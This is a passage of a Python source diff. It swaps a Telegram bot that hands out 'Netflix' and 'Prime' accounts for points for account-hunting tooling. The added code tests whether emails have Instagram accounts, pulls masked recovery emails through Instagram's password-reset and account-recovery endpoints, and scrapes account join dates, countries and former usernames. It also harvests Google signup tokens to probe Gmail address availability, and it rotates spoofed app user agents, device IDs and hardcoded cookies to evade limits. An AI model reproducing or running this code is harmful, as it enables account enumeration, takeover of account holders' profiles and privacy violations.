+            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Accept-Encoding": "gzip, deflate",
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "Origin": "https://www.instagram.com",
+            "Referer": f"https://www.instagram.com/{username}/",
+            "Cookie": _cookie,
+            "X-CSRFToken": _csrf,
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+        }, data=urllib.parse.urlencode(post_params))
+        raw = resp.text
+        if raw.startswith("for (;;);"):
+            raw = raw[9:]
+        parsed = json.loads(raw)
+        if parsed.get("error") or parsed.get("status") == "fail":
+            with about_token_lock:
+                about_tokens["fb_dtsg"] = None
+            return {"join_date": None, "country": None, "former_usernames": []}
+        result = {"join_date": None, "country": None, "former_usernames": []}
+        text_str = json.dumps(parsed, ensure_ascii=False)
+        for pat in [r'Katilma tarihi ([A-Za-z\u00c7\u00e7\u011e\u011f\u0130\u0131\u00d6\u00f6\u015e\u015f\u00dc\u00fc]+ \d{4})',
+                    r'Date joined ([A-Za-z]+ \d{4})']:
+            m = re.search(pat, text_str)
+            if m:
+                result["join_date"] = m.group(1)
+                break
         try:
-            if ch_id.startswith('-'):
-                chat_id = int(ch_id)
-            else:
-                chat_id = ch_id
-            member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
-            if member.status in ['left', 'kicked', 'restricted']:
-                missing.append(ch)
-        except Exception:
-            try:
-                if ch_username:
-                    member = await bot.get_chat_member(chat_id=f"@{ch_username}", user_id=user_id)
-                    if member.status in ['left', 'kicked', 'restricted']:
-                        missing.append(ch)
-                else:
-                    missing.append(ch)
-            except Exception:
-                missing.append(ch)
-    
-    return len(missing) == 0, missing
+            data_arr = parsed.get("payload", {}).get("layout", {}).get("bloks_payload", {}).get("data", [])
+            for item in data_arr:
+                if isinstance(item, dict):
+                    d = item.get("data", {})
+                    key = d.get("key", "")
+                    if "about_this_account_country" in key and "visibility" not in key:
+                        result["country"] = d.get("initial", "Paylasilmadi")
+                        break
+        except:
+            pass
+        former = re.findall(r'nceki kullan[^"]*"([a-zA-Z0-9._]{2,30})"', text_str)
+        if former:
+            result["former_usernames"] = list(set(former))
+        return result
+    except Exception:
+        return {"join_date": None, "country": None, "former_usernames": []}
 
-async def require_channels(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    user_id = update.effective_user.id
-    if is_admin(user_id):
+USER_AGENTS = [
+    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
+    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
+    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
+    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
+    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
+    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
+    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
+    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
+    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
+    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
+    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
+    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
+    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
+    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2340; samsung; SM-A346B; a34x; mt6877; en_GB; 479201567)",
+    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
+    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
+    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
+    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
+    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
+    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
+    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
+    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
+]
+
+_CHECK_EMAIL_UA = "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)"
+_CHECK_EMAIL_URL = "https://i.instagram.com/api/v1/users/check_email/"
+
+def rest_web_check_email(email):
+    try:
+        with httpx.Client(http2=True, timeout=6) as client:
+            response = client.post(
+                _CHECK_EMAIL_URL,
+                data={"email": email},
+                headers={
+                    "User-Agent": _CHECK_EMAIL_UA,
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                }
+            )
+            data = response.json()
+            return data.get("allow_shared_email_registration") is True
+    except:
+        return False
+
+def rest_bloks_v2(email):
+    global limit
+    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
+    device = str(uuid.uuid4())
+    family = str(uuid.uuid4())
+    android = "android-" + secrets.token_hex(8)
+    payload = {
+        'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
+        'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
+        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+    }
+    headers = {
+        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
+        'accept-language': "en-IN, en-US",
+        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+        'x-ig-android-id': android,
+        'x-ig-app-id': "567067343352427",
+        'x-ig-app-locale': "en_IN",
+        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+        'x-ig-device-id': device,
+        'x-ig-family-device-id': family,
+        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
+        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
+        'x-pigeon-rawclienttime': str(time.time()),
+        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
+    }
+    try:
+        response = requests.post(url, data=payload, headers=headers, timeout=20)
+        if f"{email}" in response.text:
+            return email
+        elif 'SOMETHING, GOT F3CKED' in response.text:
+            limit += 1
+            return None
+        else:
+            return None
+    except Exception:
+        return None
+
+def rest_bloks(email):
+    try:
+        result = rest_bloks_v2(email)
+        if result:
+            return result
+    except:
+        pass
+    try:
+        headers = {
+            "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
+            "x-ig-app-id": "567067343352427",
+        }
+        data = {
+            "search_query": email,
+            "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
+        }
+        with httpx.Client(http2=True) as client:
+            r = client.post(
+                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
+                data=data, headers=headers
+            )
+        if f"We sent a link to {email}. Use that link to confirm your account." in r.text:
+            return email
+        return None
+    except Exception:
+        return None
+
+def lookup_instagram(email):
+    if rest_web_check_email(email):
         return True
-    
-    allowed, missing = await check_user_channels(context.bot, user_id)
-    if allowed:
-        return True
-    
-    kb = []
-    for ch in missing:
-        ch_id = ch[1]
-        ch_username = ch[2]
-        ch_link = ch[3]
-        btn_text = f"{E('join')} Join {ch_username or ch_id}"
-        url = ch_link if ch_link else f"https://t.me/{ch_username}" if ch_username else None
-        if url:
-            kb.append([InlineKeyboardButton(btn_text, url=url)])
-    
-    kb.append([InlineKeyboardButton(f"{E('refresh')} I've Joined {E('check')}", callback_data="check_joined")])
-    
-    text = (
-        f"{E('lock')} **Access Restricted** {E('lock')}\n\n"
-        f"To use this bot, you must join our channel(s) first:\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"• Tap each channel button below\n"
-        f"• Click **Join** in the channel\n"
-        f"• Come back and tap **I've Joined**\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"{E('join')} After joining, tap the button below!"
-    )
-    
-    markup = InlineKeyboardMarkup(kb)
-    if update.callback_query:
-        await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=markup)
-    else:
-        await update.message.reply_text(text, parse_mode="HTML", reply_markup=markup)
-    
+    try:
+        if rest_bloks(email):
+            return True
+    except:
+        pass
     return False
 
-# ============================================================
-# 🎬 BIG "N" LOGO ANIMATION — BOLD WITH NORMAL EMOJIS
-# ============================================================
-def generate_big_n(char: str = None):
-    """Generates a bold 'N' logo using Markdown bold markers."""
-    if char is None:
-        char = random.choice(string.ascii_uppercase + string.digits)
-    
-    n_lines = [
-        f"**{char}**       **{char}**",
-        f"**{char}****{char}**      **{char}**",
-        f"**{char}** **{char}**     **{char}**",
-        f"**{char}**  **{char}**    **{char}**",
-        f"**{char}**   **{char}**   **{char}**",
-        f"**{char}**    **{char}**  **{char}**",
-        f"**{char}**     **{char}** **{char}**",
-        f"**{char}**      **{char}****{char}**",
-        f"**{char}**       **{char}**",
-    ]
-    
-    top = f"╔═══ {E('netflix')} **NETFLIX** {E('netflix')} ═══╗"
-    bottom = f"╚{'═'*25}╝"
-    lines = [top]
-    for line in n_lines:
-        lines.append(f"║   {line}   ║")
-    lines.append(bottom)
-    lines.append("")
-    lines.append(f"{E('time')} Initializing Premium Services...")
-    return "\n".join(lines)
+_BASE_URL      = "https://www.instagram.com"
+_RESET_URL     = "https://www.instagram.com/accounts/password/reset/"
+_SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
+_UA_WEB        = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+                  "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36")
+_UA_APP        = ("Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; "
+                  "samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)")
 
-async def netflix_start_animation(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    first_name = update.effective_user.first_name
-    
-    msg = await update.message.reply_text(
-        f"╔═══ {E('netflix')} **NETFLIX** {E('netflix')} ═══╗\n\n{E('time')} Starting...",
-        parse_mode="HTML"
-    )
-    
-    chars_pool = string.ascii_uppercase + string.digits
-    for i in range(12):
-        rand_char = random.choice(chars_pool)
-        logo = generate_big_n(rand_char)
+def rest_v1(username):
+    max_retries = 2
+    for attempt in range(max_retries):
         try:
-            pct = min(100, (i + 1) * 9)
-            bar = "▓" * (pct // 10) + "░" * (10 - pct // 10)
-            frame = logo + f"\n`[{bar}]` {pct}%"
-            await msg.edit_text(frame, parse_mode="HTML")
+            client = httpx.Client(http2=True, follow_redirects=True)
+            try:
+                r0 = client.get(_BASE_URL, headers={
+                    "User-Agent": _UA_WEB,
+                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
+                    "Accept-Language": "tr-TR,tr;q=0.9",
+                    "sec-fetch-dest": "document",
+                    "sec-fetch-mode": "navigate",
+                    "sec-fetch-site": "none",
+                })
+            except Exception:
+                client.close()
+                if attempt < max_retries - 1:
+                    continue
+                return "-"
+            csrf = ""
+            for c in client.cookies.jar:
+                if c.name == "csrftoken":
+                    csrf = c.value
+                    break
+            if not csrf:
+                client.close()
+                if attempt < max_retries - 1:
+                    continue
+                return "-"
+            headers = {
+                "User-Agent"       : _UA_APP,
+                "Accept"           : "*/*",
+                "Accept-Language"  : "tr-TR,tr;q=0.9",
+                "Accept-Encoding"  : "gzip, deflate, br",
+                "Content-Type"     : "application/x-www-form-urlencoded",
+                "Origin"           : _BASE_URL,
+                "Referer"          : _RESET_URL,
+                "X-CSRFToken"      : csrf,
+                "X-IG-App-ID"      : "936619743392459",
+                "X-Requested-With" : "XMLHttpRequest",
+                "X-Instagram-AJAX" : "1",
+                "X-ASBD-ID"        : "129477",
+                "sec-fetch-dest"   : "empty",
+                "sec-fetch-mode"   : "cors",
+                "sec-fetch-site"   : "same-origin",
+            }
+            data = urllib.parse.urlencode({"email_or_username": username})
+            r = client.post(_SEND_AJAX_URL, content=data.encode(), headers=headers)
+            client.close()
+            result = r.json()
+            status = result.get("status", "")
+            if status == "ok":
+                for key in ("obfuscated_email", "contact_point", "masked_email", "email"):
+                    val = result.get(key)
+                    if val:
+                        return val
+                return "-"
+            elif status == "fail":
+                return "Fail: " + result.get("message", "")
+            if attempt < max_retries - 1:
+                continue
+            return "-"
         except Exception:
-            pass
-        await asyncio.sleep(0.3)
-    
-    final_logo = generate_big_n("N")
-    welcome = (
-        f"{final_logo}\n\n"
-        f"{E('sparkle')} **WELCOME, {first_name.upper()}** {E('sparkle')}\n"
-        f"{E('premium')} **PREMIUM SERVICE READY** {E('premium')}"
-    )
+            if attempt < max_retries - 1:
+                continue
+            return "-"
+    return "-"
+
+def get_masked(query):
+    url = "https://www.instagram.com/api/graphql"
+    payload = {
+        'av': "0",
+        '__d': "www",
+        '__user': "0",
+        '__a': "1",
+        '__req': "f",
+        '__hs': "20563.HYP:instagram_web_pkg.2.1...0",
+        'dpr': "3",
+        '__ccg': "GOOD",
+        '__rev': "1037676804",
+        '__s': "nz2w5z:1vm2xs:94sap8",
+        '__hsi': "7630740602831122681",
+        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
+        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
+        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
+        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
+        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
+        '__comet_req': "7",
+        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
+        'jazoest': "22394",
+        '__spin_r': "1037676804",
+        '__spin_b': "trunk",
+        '__spin_t': "1776670246",
+        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
+        'qpl_active_flow_ids': "516759801",
+        'fb_api_caller_class': "RelayModern",
+        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
+        'server_timestamps': "true",
+        'variables': "{\"params\":{\"event_request_id\":\"7ca5daae-5770-42dd-b77b-0cf23a865a7f\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"553aadae-3ec5-4031-8395-efbabcc670ce\"}}",
+        'doc_id': "26178667145161478",
+        'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
+    }
+    headers = {
+        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+        'sec-ch-ua-model': "\"\"",
+        'x-ig-app-id': "936619743392459",
+        'x-ig-max-touch-points': "5",
+        'sec-ch-ua-mobile': "?0",
+        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
+        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
+        'sec-ch-ua-platform-version': "\"\"",
+        'x-asbd-id': "359341",
+        'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
+        'sec-ch-prefers-color-scheme': "dark",
+        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
+        'sec-ch-ua-platform': "\"Linux\"",
+        'origin': "https://www.instagram.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.instagram.com/accounts/password/reset/",
+        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
+    }
     try:
-        await msg.edit_text(welcome, parse_mode="HTML")
+        response = requests.post(url, data=payload, headers=headers, timeout=20)
+        email = next((i["contact_point"] for i in response.json()["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
+        return email
+    except:
+        return None
+
+def gtokens():
+    max_retries = 2
+    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
+    for attempt in range(max_retries + 1):
+        try:
+            ingilizalfabesiamk = 'abcdefghijklmnopqrstuvwxyz'
+            n1 = ''.join(choice(ingilizalfabesiamk) for _ in range(randrange(6, 9)))
+            n2 = ''.join(choice(ingilizalfabesiamk) for _ in range(randrange(3, 9)))
+            host = ''.join(choice(ingilizalfabesiamk) for _ in range(randrange(15, 30)))
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'en-GB,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                'google-accounts-xsrf': '1',
+                'user-agent': random.choice(USER_AGENTS)
+            }
+            res1 = requests.get(f"{CONFIG['google_url']}{endpoint}", headers=headers)
+            if res1.status_code != 200:
+                continue
+            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
+            if not tok:
+                continue
+            tl = tok.group(2)
+            cookies = {'__Host-GAPS': host}
+            headers.update({
+                'authority': 'accounts.google.com',
+                'origin': CONFIG["google_url"],
+                'referer': f"{CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
+                'user-agent': random.choice(USER_AGENTS)
+            })
+            data = {
+                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
+            }
+            response = requests.post(
+                f"{CONFIG['google_url']}/_/signup/validatepersonaldetails",
+                cookies=cookies, headers=headers, data=data
+            )
+            tl_new = response.text.split('",null,"')[1].split('"')[0] if '",null,"' in response.text else None
+            if tl_new:
+                tl = tl_new
+            host = response.cookies.get_dict().get('__Host-GAPS', host)
+            with open(CONFIG["token_file"], 'w') as f:
+                f.write(f"{tl}//{host}\n")
+            return True
+        except Exception:
+            continue
+    try:
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'en',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'origin': 'https://accounts.google.com',
+            'referer': 'https://accounts.google.com/',
+            'user-agent': random.choice(USER_AGENTS),
+            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
+            'x-same-domain': '1'
+        }
+        params = {
+            'rpcids': 'NHJMOd',
+            'source-path': '/lifecycle/steps/signup/username',
+            'hl': 'en'
+        }
+        email = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
+        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
+        response = requests.post(
+            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
+            params=params, headers=headers, data=data
+        )
+        tl_match = re.search(r'"TL:([^"]+)"', response.text)
+        if tl_match:
+            tl = tl_match.group(1)
+            host = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randrange(15, 30)))
+            with open(CONFIG["token_file"], 'w') as f:
+                f.write(f"{tl}//{host}\n")
+            return True
     except Exception:
         pass
-    await asyncio.sleep(1)
-    return msg
+    return False
 
-async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, msg=None):
-    user = update.effective_user
-    user_id = user.id
-    first_name = user.first_name or "User"
-    
-    ud = get_user(user_id)
-    pts = ud[3] if ud else 0
-    refs = ud[4] if ud else 0
-    nf = ud[7] if ud else 0
-    pr = ud[8] if ud else 0
-    
-    text = (
-        f"{E('netflix')}{E('prime')} **PREMIUM BOT** {E('premium')}\n\n"
-        f"{E('user')} **{first_name}**\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{E('star')} `{pts}` | {E('people')} `{refs}` | {E('netflix')}`{nf}` | {E('prime')}`{pr}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{E('netflix')} 3pts | {E('prime')} 4pts | {E('link')} 1pt/ref"
-    )
-    
-    kb = [
-        [InlineKeyboardButton(f"{E('user')} Profile", callback_data="profile"),
-         InlineKeyboardButton(f"{E('link')} Referral", callback_data="referral")],
-        [InlineKeyboardButton(f"{E('netflix')} Netflix (3pts)", callback_data="redeem_netflix"),
-         InlineKeyboardButton(f"{E('prime')} Prime (4pts)", callback_data="redeem_prime")],
-        [InlineKeyboardButton(f"{E('trophy')} Leaderboard", callback_data="leaderboard"),
-         InlineKeyboardButton(f"{E('key')} Redeem Code", callback_data="redeem_code")],
-        [InlineKeyboardButton(f"{E('support')} Support", callback_data="support"),
-         InlineKeyboardButton(f"{E('question')} Help", callback_data="help")],
-    ]
-    if is_admin(user_id):
-        kb.append([InlineKeyboardButton(f"{E('admin')} Admin Panel", callback_data="admin_panel")])
-    
-    markup = InlineKeyboardMarkup(kb)
-    
-    if msg:
-        await msg.edit_text(text, parse_mode="HTML", reply_markup=markup)
-    elif update.callback_query:
-        await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=markup)
-    else:
-        await update.message.reply_text(text, parse_mode="HTML", reply_markup=markup)
-
-# ============================================================
-# 🏠 START COMMAND
-# ============================================================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-    username = user.username or ""
-    first_name = user.first_name or "User"
-
-    allowed, _ = await check_user_channels(context.bot, user_id)
-    if not allowed and not is_admin(user_id):
-        await require_channels(update, context)
-        return
-
-    referrer_id = None
-    if context.args and len(context.args) > 0:
+def get_tl_background():
+    while True:
         try:
-            ref_arg = context.args[0]
-            if ref_arg.startswith("ref_"):
-                referrer_id = int(ref_arg.replace("ref_", ""))
-                if referrer_id == user_id:
-                    referrer_id = None
+            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
+            params = {
+                'hl': "en-GB",
+                '_reqid': "46000",
+                'rt': "j"
+            }
+            payload = {
+                'continue': "https://accounts.google.com/ManageAccount?nc=1",
+                'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
+                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
+                'cookiesDisabled': "false",
+                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
+                'gmscoreversion': "null",
+                'flowName': "GlifWebSignIn",
+                'checkConnection': "youtube:301",
+                'checkedDomains': "youtube",
+                'pstMsg': "1",
+                '': ""
+            }
+            headers = {
+                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+                'x-same-domain': "1",
+                'google-accounts-xsrf': "1",
+                'sec-ch-ua-mobile': "?1",
+                'sec-ch-ua-platform': "\"Android\"",
+                'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
+                'origin': "https://accounts.google.com",
+                'x-client-data': "CP/xygE=",
+                'sec-fetch-site': "same-origin",
+                'sec-fetch-mode': "cors",
+                'sec-fetch-dest': "empty",
+                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
+                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
+            }
+            response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
+            tl_1 = json.loads(response.text[5:])[0][1][2]
+            url = "https://accounts.google.com/_/signup/validatebasicinfo"
+            params = {
+                'hl': "en-GB",
+                'TL': tl_1,
+                '_reqid': "346000",
+                'rt': "j"
+            }
+            payload = {
+                'continue': "https://accounts.google.com/ManageAccount?nc=1",
+                'f.req': "[\"TL:"+ tl_1 +"\",2015,4,15,2,null,null,0,null,null,0,0]",
